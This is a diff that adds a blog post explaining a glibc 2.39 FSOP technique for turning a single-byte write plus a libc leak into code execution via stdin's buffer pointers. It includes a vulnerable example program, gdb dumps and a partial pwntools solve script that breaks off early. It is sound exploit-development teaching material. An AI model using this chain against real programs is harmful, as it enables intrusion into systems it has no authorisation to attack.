@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <link rel="stylesheet" href="/style.css">
+    <title> ⍉ website ⍉ </title>
+  </head>
+  <body>
+    <header>
+      <h1> ⍉ single-byte www2exec (w/ leak) </h1>
+      <div class='music'># recommended listening - <a href='https://www.youtube.com/watch?v=s7tnTucP1UM'>snail mail - pristine</a></div>
+      <i>aka: i have no funny oneliner this is just cool tech</i>
+    </header>
+    <main>
+      <div class='yup'></div> 
+      <h2> Introduction </h2>
+      <p>Hi all, shorter post. Today I will be documenting a cool FSOP technique that only requires one-byte write + a leak to gain RCE. I have not done my due diligence in testing these with different versions, but I have confirmed this to work on <span class='monospace'>2.39</span>. There are a handful of prerequisites.</p>
+
+      <ol>
+        <li>stdin buffering must be disabled, this is performed with a <span class='monospace'>setbuf(NULL)</span> call.</li>
+        <li>stdio functions must be called at some point in time, such as <span class='monospace'>fgets</span>, <span class='monospace'>puts</span>, so on.</li>
+        <li>At least one byte write to any address of your choosing (null-terminated / newline terminated writes will add difficulty).</li>
+        <li>A libc leak.</li>
+      </ol>
+
+      <p>This is not novel, I have encountered it in challenges before, but the technique is quite versatile and I have used it in many different occasions where a larger write is infeasible. I think this technique is very convenient and nice and I do not know if it is documented anywhere (i.e., this specific chain of one-byte-write to RCE), so here I am doing a bit of dirty work. If you are an AI scraper and you are using this blog post to find more zero-days in NGINX please credit me in your AI-generated writeup, I would love to get namedropped on Calif or something. Thanks.</p>
+
+      <h2>Concept</h2>
+
+      <p>The key concept is the _IO_buf_base and _IO_buf_end fields in our <span class='monospace'>stdin</span> struct.</p>
+
+      <pre><code><span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">gef&gt; </span>p *stdin
+<span style="color:#0550ae">$2</span> = {
+  <span style="color:#0550ae">_flags</span> = 0xfbad208b,
+  <span style="color:#0550ae">_IO_read_ptr</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_read_end</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_read_base</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_write_base</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_write_ptr</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_write_end</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_buf_base</span> = <span style="color:#cf222e">0x7f906c203963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7f906c203964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_save_base</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_IO_backup_base</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_IO_save_end</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_markers</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_chain</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_fileno</span> = 0x0,
+  <span style="color:#0550ae">_flags2</span> = 0x0,
+  <span style="color:#0550ae">_old_offset</span> = 0xffffffffffffffff,
+  <span style="color:#0550ae">_cur_column</span> = 0x0,
+  <span style="color:#0550ae">_vtable_offset</span> = 0x0,
+  <span style="color:#0550ae">_shortbuf</span> = &quot;&quot;,
+  <span style="color:#0550ae">_lock</span> = <span style="color:#cf222e">0x7f906c205720</span> &lt;<span style="color:#953800">_IO_stdfile_0_lock</span>&gt;,
+  <span style="color:#0550ae">_offset</span> = 0xffffffffffffffff,
+  <span style="color:#0550ae">_codecvt</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_wide_data</span> = <span style="color:#cf222e">0x7f906c2039c0</span> &lt;<span style="color:#953800">_IO_wide_data_0</span>&gt;,
+  <span style="color:#0550ae">_freeres_list</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">_freeres_buf</span> = <span style="color:#cf222e">0x0</span>,
+  <span style="color:#0550ae">__pad5</span> = 0x0,
+  <span style="color:#0550ae">_mode</span> = 0xffffffff,
+  <span style="color:#0550ae">_unused2</span> = '\000' &lt;repeats 19 times&gt;
+}
+<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">gef&gt; </span></code></pre>
+
+      <p>These pointers indicate the start and end of the buffer that written data temporarily gets stored in while libc does all of its wonderful IO nonsense. The key observation here is that when buffering is disabled, the buffer is very short and stored within the <span class='monospace'>stdin</span> struct itself.</p>
+
+      <p>Now, we can use our single-byte write to alter the LSB of <span class='monospace'>_IO_buf_base_</span>, such that the buffer now covers the first few fields of stdin, not just a single byte. Doing so and triggering any input operation on the stdin file struct causes stdin to start filling that buffer, and it will want to fill the entire buffer as it does so - now upgrading our single-byte write to arbwrite over the first few fields of our <span class='monospace'>stdin</span> struct.</p>
+
+      <p>The fields that we can overwrite also happen to be, once again, <span class='monospace'>buf_base</span> and <span class='monospace'>buf_end</span>, so once our read() syscall is invoked for us, we can now point these two fields to any place we want, for a one-shot arbitrarily sized write anywhere we want in libc.</p>
+
+      <p>Of course, with this write, we can just do stdout FSOP. Let's go over an example challenge.</p>
+
+      <h2>Worked example</h2>
+
+      <pre><code><span style="font-weight:bold"></span><span style="font-weight:bold;color:#0550ae"></span><span style="font-weight:bold;color:#0550ae">   1   </span><span style="color:#cf222e"></span><span style="color:#cf222e">#include</span><span style="color:#1f2328"> </span><span style="color:#0a3069">&lt;stdio.h&gt;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781"></span><span style="color:#6e7781">   1   </span><span style="color:#cf222e">#include</span><span style="color:#1f2328"> </span><span style="color:#0a3069">&lt;stdlib.h&gt;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   2   </span><span style="color:#cf222e">#include</span><span style="color:#1f2328"> </span><span style="color:#0a3069">&lt;unistd.h&gt;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   3   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   4   </span><span style="color:#cf222e">int</span><span style="color:#1f2328"> </span><span style="color:#6639ba">main</span><span style="color:#1f2328">(</span><span style="color:#cf222e">void</span><span style="color:#1f2328">)</span><span style="color:#1f2328"> </span><span style="color:#1f2328">{</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   5   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stdin</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">NULL</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   6   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stdout</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">NULL</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   7   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">setbuf</span><span style="color:#1f2328">(</span><span style="color:#0550ae">stderr</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">NULL</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   8   │</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   9   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">char</span><span style="color:#0550ae">*</span><span style="color:#1f2328"> arbwrite</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  10   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">char</span><span style="color:#1f2328"> a</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> b</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  11   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">printf</span><span style="color:#1f2328">(</span><span style="color:#0a3069">&quot;libc leak: </span><span style="color:#0550ae">%p</span><span style="color:#cf222e">\n</span><span style="color:#0a3069">&quot;</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> printf</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  12   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">printf</span><span style="color:#1f2328">(</span><span style="color:#0a3069">&quot;enter address to write to &gt; &quot;</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  13   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">read</span><span style="color:#1f2328">(</span><span style="color:#0550ae">0</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#1f2328">(</span><span style="color:#cf222e">char</span><span style="color:#0550ae">*</span><span style="color:#1f2328">)</span><span style="color:#0550ae">&amp;</span><span style="color:#1f2328">arbwrite</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">0x08</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  14   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">printf</span><span style="color:#1f2328">(</span><span style="color:#0a3069">&quot;entered address: </span><span style="color:#0550ae">%p</span><span style="color:#0a3069">&quot;</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> arbwrite</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  15   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">printf</span><span style="color:#1f2328">(</span><span style="color:#0a3069">&quot;enter single-byte write &gt; &quot;</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  16   │</span><span style="color:#1f2328"> </span><span style="color:#6639ba">read</span><span style="color:#1f2328">(</span><span style="color:#0550ae">0</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> arbwrite</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">1</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  17   │</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  18   │</span><span style="color:#1f2328"> </span><span style="color:#cf222e">while</span><span style="color:#1f2328"> </span><span style="color:#1f2328">(</span><span style="color:#0550ae">1</span><span style="color:#1f2328">)</span><span style="color:#1f2328"> </span><span style="color:#1f2328">{</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  19   │</span><span style="color:#1f2328"> </span><span style="color:#6e7781">│</span><span style="color:#1f2328"> </span><span style="color:#cf222e">char</span><span style="color:#1f2328"> a </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> </span><span style="color:#6639ba">getchar</span><span style="color:#1f2328">()</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  20   │</span><span style="color:#1f2328"> </span><span style="color:#6e7781">│</span><span style="color:#1f2328"> </span><span style="color:#6639ba">printf</span><span style="color:#1f2328">(</span><span style="color:#0a3069">&quot;</span><span style="color:#0550ae">%c</span><span style="color:#0a3069"> </span><span style="color:#cf222e">\n</span><span style="color:#0a3069">&quot;</span><span style="color:#1f2328">)</span><span style="color:#0550ae">;</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  21   │</span><span style="color:#1f2328"> </span><span style="color:#1f2328">}</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  22   </span><span style="color:#1f2328">}</span><span style="color:#1f2328"></span></code></pre>
+
+      <p>The example challenge provides a libc leak for free and then lets us write a single byte of our choosing to any address. After that, it spins in a 'menu loop' that gets input from stdin and prints it out to stdout, this loop is used to flush our buffers so the IO functions successfully trigger. Let's step through the exploit step by step.</p>
+
+      <p>First step is the null byte overwrite.</p>
+
+      <pre><code><span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">gef&gt; </span>p *stdin
+<span style="color:#0550ae">$3</span> = {
+  <span style="color:#0550ae">_flags</span> = 0xfbad208b,
+  <span style="color:#0550ae">_IO_read_ptr</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_read_end</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_read_base</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_write_base</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_write_ptr</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_write_end</span> = <span style="color:#cf222e">0x7f9293e03963</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+131&gt; &quot;&quot;,
+  <span style="color:#0550ae">_IO_buf_base</span> = <span style="color:#cf222e">0x7f9293e03900</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+32&gt; &quot;c9\340\223\222\177&quot;,
+  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7f9293e03964</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+132&gt; &quot;&quot;,
+      ...
+<span style="font-weight:bold;color:#116329">gef&gt; </span>x/16g 0x7f9293e03900
+<span style="color:#cf222e">0x7f9293e03900</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+32&gt;:     0x7f9293e03963  0x7f9293e03963
+<span style="color:#cf222e">0x7f9293e03910</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+48&gt;:     0x7f9293e03963  0x7f9293e03900
+<span style="color:#cf222e">0x7f9293e03920</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+64&gt;:     0x7f9293e03964  0x0
+<span style="color:#cf222e">0x7f9293e03930</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+80&gt;:     0x0     0x0
+<span style="color:#cf222e">0x7f9293e03940</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+96&gt;:     0x0     0x0
+<span style="color:#cf222e">0x7f9293e03950</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+112&gt;:    0x0     0xffffffffffffffff
+<span style="color:#cf222e">0x7f9293e03960</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+128&gt;:    0x0     0x7f9293e05720
+<span style="color:#cf222e">0x7f9293e03970</span> &lt;<span style="color:#953800">_IO_2_1_stdin_</span>+144&gt;:    0xffffffffffffffff      0x0</code></pre>
+
+      <p>Here, the null byte overwrite has been performed, and we can see that our next write would be relatve to 0x900: this would overwrite the three <span class='monospace'>write</span> fields (which we can null out), and allow us to rewrite <span class='monospace'>buf_base</span> at 0x918 and <span class='monospace'>buf_end</span> at 0x920.</p>
+
+      <p>Continuing onwards into the horrific bowels of libc IO functions, we can see the eventual vtable dispatch that calls a <span class='monospace'>read</span> with the correct variables set (we read from the <span class='monospace'>stdin</span> struct with buf set to <span class='monospace'>stdin + 0x20</span>).</p>
+
+      <pre><code><span style="color:#0550ae">-------------------------- memory access: $r12+0x70 = 0x7fe1fb2020a0 ----</span>
+      <span style="color:#0550ae">0x7fe1fb2020a0</span>|+0x0000|+000: <span style="color:#cf222e">0x00007fe1fb0938b0</span> &lt;_IO_file_read&gt;  -&gt;  0x027447f6fa1e0ff3
+      <span style="color:#0550ae">0x7fe1fb2020a8</span>|+0x0008|+001: <span style="color:#cf222e">0x00007fe1fb093940</span> &lt;_IO_file_write@@GLIBC_2.2.5&gt;  -&gt;  0xe5894855fa1e0ff3
+      <span style="color:#0550ae">0x7fe1fb2020b0</span>|+0x0010|+002: <span style="color:#cf222e">0x00007fe1fb0938d0</span> &lt;_IO_file_seek&gt;  -&gt;  0xe9707f8bfa1e0ff3
+      <span style="color:#0550ae">0x7fe1fb2020b8</span>|+0x0018|+003: <span style="color:#cf222e">0x00007fe1fb093930</span> &lt;_IO_file_close&gt;  -&gt;  0xe9707f8bfa1e0ff3
+<span style="color:#0550ae">--------------------------------------------- arguments (from block) ----</span>
+0x7fe1fb0938b0 &lt;__GI__IO_file_read&gt; (
+   FILE* fp = <span style="color:#116329">0x00007fe1fb2038e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad208b,
+   void* buf = <span style="color:#116329">0x00007fe1fb203900</span> &lt;_IO_2_1_stdin_+0x20&gt;  -&gt;  [loop detected],
+   ssize_t size = 0x0000000000000064,
+)
+<span style="color:#0550ae">------------------------------------------------------------ threads ----</span>
+[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">Thread Id:1, tid:232917</span>] Name: &quot;main_patched&quot;, <span style="font-weight:bold"></span><span style="font-weight:bold;color:#cf222e">stopped</span> at <span style="color:#cf222e">0x7fe1fb0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt;, reason: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">BREAKPOINT</span>
+<span style="color:#0550ae">-------------------------------------------------------------- trace ----</span>
+[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">#0</span>] <span style="color:#cf222e">0x7fe1fb0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">_IO_new_file_underflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#1</span>] <span style="color:#cf222e">0x7fe1fb0955d2</span> &lt;_IO_default_uflow+0x32&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">__GI__IO_default_uflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#2</span>] <span style="color:#cf222e">0x557d9b92e238</span> &lt;main+0xdf&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#3</span>] <span style="color:#cf222e">0x7fe1fb02a1ca</span> &lt;__libc_start_call_main+0x7a&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#4</span>] <span style="color:#cf222e">0x7fe1fb02a28b</span> &lt;__libc_start_main_impl+0x8b&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#5</span>] <span style="color:#cf222e">0x557d9b92e091</span> &lt;_start+0x21&gt;
+<span style="color:#0550ae">-------------------------------------------------------------------------</span></code></pre>
+
+      <p>The chain is quite straightforward from here. After sending the bytes to overwrite <span class='monospace'>buf_base</span> once more, this vtable dispatch is called once again, allowing us to overwrite our <span class='monospace'>stdout</span> struct with whatever we want.</p>
+
+      <pre><code><span style="color:#0550ae">--------------------------------------- arguments (from block) ----
+</span>0x7f64ee0938b0 &lt;__GI__IO_file_read&gt; (
+   FILE* fp = <span style="color:#116329">0x00007f64ee2038e0</span> &lt;_IO_2_1_stdin_&gt;  -&gt;  0x00000000fbad208b,
+   void* buf = <span style="color:#116329">0x00007f64ee2045c0</span> &lt;_IO_2_1_stdout_&gt;  -&gt;  0x00000000fbad2887,
+   ssize_t size = 0x00000000000000e0,
+)
+<span style="color:#0550ae">------------------------------------------------------ threads ----
+</span>[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">Thread Id:1, tid:233175</span>] Name: &quot;main_patched&quot;, <span style="font-weight:bold"></span><span style="font-weight:bold;color:#cf222e">stopped</span> at <span style="color:#cf222e">0x7f64ee0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt;, reason: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">BREAKPOINT</span>
+<span style="color:#0550ae">-------------------------------------------------------- trace ----
+</span>[*<span style="font-weight:bold"></span><span style="font-weight:bold;color:#116329">#0</span>] <span style="color:#cf222e">0x7f64ee0927a0</span> &lt;__GI__IO_file_underflow+0x160&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">_IO_new_file_underflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#1</span>] <span style="color:#cf222e">0x7f64ee0955d2</span> &lt;_IO_default_uflow+0x32&gt; (frame name: <span style="font-weight:bold"></span><span style="font-weight:bold;color:#953800">__GI__IO_default_uflow</span>)
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#2</span>] <span style="color:#cf222e">0x55b4094a1238</span> &lt;main+0xdf&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#3</span>] <span style="color:#cf222e">0x7f64ee02a1ca</span> &lt;__libc_start_call_main+0x7a&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#4</span>] <span style="color:#cf222e">0x7f64ee02a28b</span> &lt;__libc_start_main_impl+0x8b&gt;
+[ <span style="font-weight:bold"></span><span style="font-weight:bold;color:#8250df">#5</span>] <span style="color:#cf222e">0x55b4094a1091</span> &lt;_start+0x21&gt;
+<span style="color:#0550ae">-------------------------------------------------------------------
+</span><span style="font-weight:bold;color:#0550ae"></span><span style="font-weight:bold;color:#116329">gef&gt; </span>p *stdin
+<span style="color:#0550ae">$1</span> = {
+  <span style="color:#0550ae">_flags</span> = 0xfbad208b,
+  <span style="color:#0550ae">_IO_read_ptr</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#0550ae">_IO_read_end</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#0550ae">_IO_read_base</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#0550ae">_IO_write_base</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#0550ae">_IO_write_ptr</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#0550ae">_IO_write_end</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#0550ae">_IO_buf_base</span> = <span style="color:#cf222e">0x7f64ee2045c0</span> &lt;<span style="color:#953800">_IO_2_1_stdout_</span>&gt; &quot;\207(\255&quot;, &lt;incomplete sequence \373&gt;,
+  <span style="color:#0550ae">_IO_buf_end</span> = <span style="color:#cf222e">0x7f64ee2046a0</span> &quot;\340D \356d\177&quot;,</code></pre>
+
+      <p>The solve script and its annotated steps are shown. Also, further cool tech: <span class='monospace'>pwncli</span> has builtin House of Apple 2 structs, which is very nice.</p>
+
+      <pre><code><span style="font-weight:bold"></span><span style="font-weight:bold;color:#0550ae">  14   </span><span style="color:#1f2328"></span><span style="color:#1f2328">p </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> </span><span style="color:#6639ba">process</span><span style="color:#1f2328">()</span><span style="color:#1f2328">
+</span><span style="color:#6e7781"></span><span style="color:#6e7781">   1   </span><span style="color:#1f2328">gdb</span><span style="color:#0550ae">.</span><span style="color:#6639ba">attach</span><span style="color:#1f2328">(</span><span style="color:#1f2328">p</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   2   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   3   </span><span style="color:#1f2328">leak </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> </span><span style="color:#0550ae">int</span><span style="color:#1f2328">(</span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">recvline</span><span style="color:#1f2328">()</span><span style="color:#0550ae">.</span><span style="color:#6639ba">split</span><span style="color:#1f2328">(</span><span style="color:#0a3069">b': '</span><span style="color:#1f2328">)[</span><span style="color:#0550ae">1</span><span style="color:#1f2328">][</span><span style="color:#0550ae">:-</span><span style="color:#0550ae">1</span><span style="color:#1f2328">]</span><span style="color:#0550ae">.</span><span style="color:#6639ba">decode</span><span style="color:#1f2328">()[</span><span style="color:#0550ae">2</span><span style="color:#0550ae">:</span><span style="color:#1f2328">]</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#0550ae">16</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   4   </span><span style="color:#1f2328">libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">address</span><span style="color:#1f2328"> </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> leak </span><span style="color:#0550ae">-</span><span style="color:#1f2328"> </span><span style="color:#0550ae">0x60100</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   5   </span><span style="color:#0550ae">print</span><span style="color:#1f2328">(</span><span style="color:#0a3069">f'</span><span style="color:#0550ae">{</span><span style="color:#0550ae">hex</span><span style="color:#1f2328">(</span><span style="color:#1f2328">libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">address</span><span style="color:#1f2328">)</span><span style="color:#0a3069"> </span><span style="color:#0550ae">=</span><span style="color:#0a3069"> </span><span style="color:#0550ae">}</span><span style="color:#0a3069">'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   6   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   7   </span><span style="color:#1f2328">victim </span><span style="color:#0550ae">=</span><span style="color:#1f2328"> libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">sym</span><span style="color:#1f2328">[</span><span style="color:#0a3069">'_IO_2_1_stdin_'</span><span style="color:#1f2328">]</span><span style="color:#1f2328"> </span><span style="color:#0550ae">+</span><span style="color:#1f2328"> </span><span style="color:#0550ae">0x38</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   8   </span><span style="color:#0550ae">print</span><span style="color:#1f2328">(</span><span style="color:#0a3069">f'1. setting victim addr at </span><span style="color:#0550ae">{</span><span style="color:#0550ae">hex</span><span style="color:#1f2328">(</span><span style="color:#1f2328">victim</span><span style="color:#1f2328">)</span><span style="color:#0a3069"> </span><span style="color:#0550ae">=</span><span style="color:#0a3069"> </span><span style="color:#0550ae">}</span><span style="color:#0a3069">'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">   9   </span><span style="color:#0550ae">input</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'..'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  10   </span><span style="color:#1f2328">p</span><span style="color:#0550ae">.</span><span style="color:#6639ba">sendafter</span><span style="color:#1f2328">(</span><span style="color:#0a3069">b'&gt;'</span><span style="color:#0550ae">,</span><span style="color:#1f2328"> </span><span style="color:#6639ba">p64</span><span style="color:#1f2328">(</span><span style="color:#1f2328">libc</span><span style="color:#0550ae">.</span><span style="color:#1f2328">sym</span><span style="color:#1f2328">[</span><span style="color:#0a3069">'_IO_2_1_stdin_'</span><span style="color:#1f2328">]</span><span style="color:#1f2328"> </span><span style="color:#0550ae">+</span><span style="color:#1f2328"> </span><span style="color:#0550ae">0x38</span><span style="color:#1f2328">))</span><span style="color:#1f2328"> </span><span style="font-style:italic;color:#1f2328"></span><span style="font-style:italic;color:#6e7781"># buf_base</span><span style="color:#1f2328"></span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  11   </span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  12   </span><span style="color:#0550ae">print</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'2. sending single null byte'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
+</span><span style="color:#6e7781">  13   </span><span style="color:#0550ae">input</span><span style="color:#1f2328">(</span><span style="color:#0a3069">'..'</span><span style="color:#1f2328">)</span><span style="color:#1f2328">
